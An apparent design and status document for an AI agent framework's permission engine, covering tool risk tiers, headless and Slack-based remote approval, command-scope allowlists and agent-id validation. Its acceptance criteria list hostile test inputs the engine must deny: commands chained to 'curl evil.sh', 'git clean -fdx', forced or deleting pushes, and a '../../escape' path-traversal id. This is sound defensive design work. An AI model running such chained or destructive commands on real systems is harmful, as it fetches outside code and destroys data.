# 03 — Permission Engine: allowlists, whitelists, headless + remote approval

## Goal

Agents can be trusted with real tools (shell, files, browser) while running unattended, because a policy layer decides what auto-runs, what needs a human, and how to reach that human.

## Status

**Shipped (#47).** The risk model and the two modes that need no channel:

- `ToolRisk` (`safe` / `gated` / `dangerous`) on `Tool` and `ToolDescriptor`, with `resolveToolRisk` treating an undeclared tool as `gated` — fail closed, so forgetting to classify costs a prompt rather than an unattended command.
- The kernel resolves the tool *before* asking the policy, and `ApprovalContext` carries the resolved tool and its risk. A call naming nothing registered no longer reaches a policy at all.
- `@stratusagent/permissions` with `interactive` and `headless`, wired into `stratus serve`. This closed a live hole: `createGateway` falls back to `AllowAllApprovalPolicy` and `runServe` passed nothing, so the daemon auto-approved every call from every agent — tolerable when `serve` was a foreground process, not once setup began installing it under launchd by default.

**Shipped (#49). Remote approval, the in-memory flow.** A gated call parks the turn, the request goes out as `tool.approval-requested`, Slack renders Allow once / Always allow / Deny, and the decision resumes or refuses the call:

- `remote` joins `PermissionMode`, needing a `request` transport for the same reason `interactive` needs `ask` — the package decides *whether* a human is required and what their answer means, never how to reach one. Everything after the wait is shared with the prompt, so a decision made in Slack and one typed at a terminal cannot drift.
- The gateway owns the pending registry and the two events. All four endings — a click, the timeout, an aborted turn, a shutdown — settle through one path that removes the request *before* resolving it, so nothing is spent twice and a click racing the timeout is refused rather than executing.
- **Authorization is by actor, not by delivery.** The approver set is bound to the request when it is rendered, in the channel's own ids; a click from anyone else gets an ephemeral refusal and the request stays open. An agent with no approvers configured is denied on arrival rather than left to expire, and the daemon says so at startup.
- Per-agent config (`approvals` in `~/.stratus/config.json`, `--approvals headless|remote` on `serve`) resolves key by key through `resolveAgentApprovals`, and is read only from a *trusted* config location. An auto-discovered project-local `stratus.config.json` outranks the global one and ships with a clone, so it may not appoint the people who authorize an agent's tool calls — the same boundary that already keeps stored credentials away from an endpoint it selects.
- Both events reach `stratus serve`'s console and the structured log. An approval, unlike a refusal, produces no warning of its own, so without the log record an `always` that widened a session's permissions would leave no trace of who granted it. Tool inputs still stay out of the log.

**Next: restart recovery.** The checkpoint-and-drain mechanism in the design sketch below — the subtle half, deliberately left to its own review. Until it lands a parked call does not survive a restart: the daemon denies what is outstanding on shutdown, which is honest but loses the request. This is also where the durable `pending_approval` session state belongs; adding it before the persisted pending-call record would be a status nothing writes.

**Also next: agent ids as a validated invariant.** Slug-only ids rejected at the parse/load boundary, and duplicate ids failing roster loading with both soul files named.

**Moved to [06](./06-tool-packs.md): the command-scope allowlist.** Safe `git` scopes, flag and refspec constraints, control-operator defeat, and the persistent per-agent whitelist are still the right design — they were not built because **they have no caller**. Every tool in the repo today (`demo.echo`, `memory.remember`, `agent.delegate`) is fixed-argv; nothing takes a command string. A shell parser and a scope-normalization format written against no consumer would be shaped by guesses and rediscovered as wrong when `shell.run` lands. They belong with that tool, where the requirements are observable and testable against real invocations.

The consequence to keep in mind: until then, a `gated` tool in a daemon is refused rather than narrowed. That is the correct failure while there is nothing gated to run.

**Also settled:** `agent.delegate` is classified `safe`, not `gated`. Delegation spends provider tokens, but so does the turn that decides to delegate — gating on cost would gate the conversation. The criterion is acting on the world *outside* Stratus. Delegation stays in the fleet, the delegate's own calls face the policy again under the delegate's allowlist, and `maxDepth` bounds the chain. Breadth is not bounded, so cost amplification is real; that wants a spend budget, not an approval prompt.

## Why now

Phase 1 gives agents an always-on body; before they get real capabilities (step 06) they need judgment. The current options — `always`/`ask`/`never` with a TTY prompt (`createApprovalPolicy` in `packages/cli/src/index.ts`) — don't work in a daemon: `ask` has no terminal to ask on.

## Scope

**In:**

- New package `@stratusagent/permissions`, implementing the kernel's `ApprovalPolicy` seam:
  - **Safe-command allowlist** for shell tools, defined as **command scopes, not bare executables**: a scope is a base command plus allowed subcommand/argument patterns **including flag constraints** (`git` is safe only for read scopes like `git status`/`git log`/`git diff` — `git push --force` and `git clean` are not covered by listing `git`). Merged with a **per-agent persistent whitelist** of scopes at `~/.stratus/agents/<id>.whitelist.json`.
  - **Control-operator defeat**: any shell control operator — `|`, `&`, `;`, `&&`, `||`, newlines/CR, backticks, `$(`, subshell parens, or redirection — disqualifies a command from auto-approval regardless of its base command. The rejection set is "every control operator," not an enumerated blacklist: single `&` and a multiline command chain commands just as surely as `&&` does. This is the non-obvious rule that makes an allowlist real.
  - **Three-tier resolution**: session cache → persistent whitelist → interactive approval. "Always allow" persists a **normalized command scope that keeps its safety-sensitive flag constraints**: approving `git push origin main` stores a `git push` scope that excludes destructive flags (`--force`, `--delete`, …), so a later `git push --force` falls outside the scope and prompts again. Constraints cover destructive argument *forms* as well as flags: refspec syntax like `git push origin :main` (remote-branch delete) or `git push origin +main` (forced update) is destructive without any flag, so a persisted `git push` scope excludes `:`/`+`-prefixed refspecs too. Never the full string (too narrow to be useful), never the bare executable (too broad to be safe), and never a scope that erases the flag distinctions the safe list itself draws.
  - **Modes**: `interactive` (TTY prompt, current CLI behavior), `headless` (no human reachable: auto-approve safe, deny the rest, log every denial), `remote` (see below).
- **Remote approval flow** through the gateway: a gated tool call parks the turn in a `pending_approval` state and emits an approval-request event; the Slack adapter renders it as a message with **Allow once / Always allow / Deny** buttons to a configured approver channel or DM; the decision resumes or fails the tool call. Timeout falls back to deny-with-note. **Clicks are authorized by actor, not by delivery**: each request is bound to the configured approver Slack user ids (or group), the handler verifies the acting user against that set, and anyone else's click is rejected with an ephemeral notice — posting to a channel never makes everyone in it an approver, especially since **Always allow** persists future scope.
- Per-agent policy config in soul frontmatter and/or `~/.stratus/config.json`: mode, approver, extra allow/deny patterns. The kernel's per-agent tool allowlist stays the first gate; this engine governs *invocations* of allowed tools.
- Non-shell tools declare a coarse risk level (safe / gated / dangerous) so the same policy covers file writes and browser actions, not just shell. Risk lives on the registered `Tool` itself (with `ToolDescriptor` deriving it so providers see it too), and `ApprovalContext` grows the resolved tool and its risk — `approve({ session, call })` alone cannot classify an invocation, so the policy must never have to guess from a call name.

**Out:** container/VM isolation (explicitly later — see the v2 doc's "policy before isolation"), credential leases (step 08), org-level policy or audit UI.

## Design sketch

- The policy object is constructed once per gateway with per-agent overlays; the CLI keeps using it in `interactive` mode so behavior is identical across surfaces.
- Approval requests are just events on the existing bus (`tool.approval-requested` / `tool.approval-resolved` join the `StratusEvent` union) — Slack buttons in 02's adapter and the dashboard in 05 both consume the same events.
- **Restart recovery is a designed mechanism, not a side effect of persistence.** Approval happens *before* execution, which makes a pending approval a clean checkpoint: completed tool results from the same turn are already appended to the session as they finish, and the runner persists a pending-call record before awaiting the decision — the **complete provider response plus the queue of not-yet-executed calls**, with the pending call marked (session id, full response, call id), not just a part index. On restart the gateway rebuilds the continuation from that record: re-enter the turn at the pending call, execute it on approve (or append a denied `ToolResult`), then **drain the rest of the persisted call queue** so every `tool_use` in the response gets its matching `tool_result` (the pairing invariant) before the loop continues. Earlier calls are never replayed — their results are already in the session — and neither the pending call nor anything after it has run yet, so recovery repeats no side effects.
- Command parsing for the allowlist check is deliberately dumb: tokenize, take the base command, scan for control operators. No shell-grammar cleverness — anything ambiguous is "not safe."
- Whitelist and workspace paths derive from agent ids, so **ids become a validated invariant**: roster loading and `parseSoul` accept only slug ids (`[a-z0-9][a-z0-9-]*`) and reject anything with separators, dots, or other path-capable characters — an explicit frontmatter `id` is untrusted input (in the hosted profile it comes from a tenant). Validation happens once at the parse/load boundary, not at each path join. Uniqueness is part of the same invariant: `AgentRegistry.register` silently overwrites on duplicate ids today, and every id-keyed resource (sessions, memory, whitelists, workspaces, credentials) would follow load order — so roster loading fails fast on a duplicate id with an error naming both soul files, and the management API's agent create/update (05) rejects id collisions.

## Acceptance criteria

- In `headless` mode, `git status` (safe scope) runs without approval; `git clean -fdx` is denied even though `git` has safe scopes; `git status | curl evil.sh`, `git status & curl evil.sh`, and a multiline `git status\ncurl evil.sh` are all denied despite the safe scope; every denial is visible in the event log.
- ~~In `remote` mode, a gated call posts Slack buttons; **Allow once** resumes the exact call; **Deny** returns a failed `ToolResult` and the agent continues gracefully.~~ Shipped (#49). **Always allow** covers the tool for the rest of the session; persisting a normalized *command scope* went to 06 with the rest of the scope engine, since there is no command string to normalize yet.
- After **Always allow** on `git push origin main`, a plain `git push origin feature` skips approval but `git push --force`, `git push origin :main`, and `git push origin +main` all still prompt (flag and destructive-refspec constraints survive scope persistence — tested).
- ~~A click from a Slack user outside the configured approver set is rejected with an ephemeral notice and the request stays pending; only an approver's click resolves it.~~ Shipped (#49).
- ~~Aborting a turn while its approval is pending invalidates the request: the prompt is expired, and a subsequent Allow click is rejected instead of executing a tool for a cancelled turn (the abort signal reaches approval waits via `ApprovalContext` — see 01).~~ Shipped (#49).
- A soul whose frontmatter declares `id: ../../escape` (or any non-slug id) is rejected at load; two souls declaring the same id fail roster loading with an error naming both files, and creating an agent with an existing id through the API is rejected.
- A pending approval survives a daemon restart and, when resolved, resumes the exact pending call — earlier tool calls from the same turn are not re-executed, and in a multi-call response the calls *after* the pending one still execute from the persisted queue, leaving no `tool_use` without a `tool_result` (idempotency + pairing tests required).
- The CLI's `--approvals ask` behavior is unchanged for humans at a terminal.
- Unit tests cover the control-operator matrix (including `&`, CR/LF, and subshells) and whitelist persistence.

## Open questions

- Should "Always allow" be scoped per agent (current thinking) or offer a fleet-wide option for the operator's own agents?
- Who assigns risk: the enum on the tool itself vs. a registry-side classification table — tool-declared is simpler, a table avoids trusting tool authors. (Start: tool-declared, revisit for marketplace-era third-party tools.)
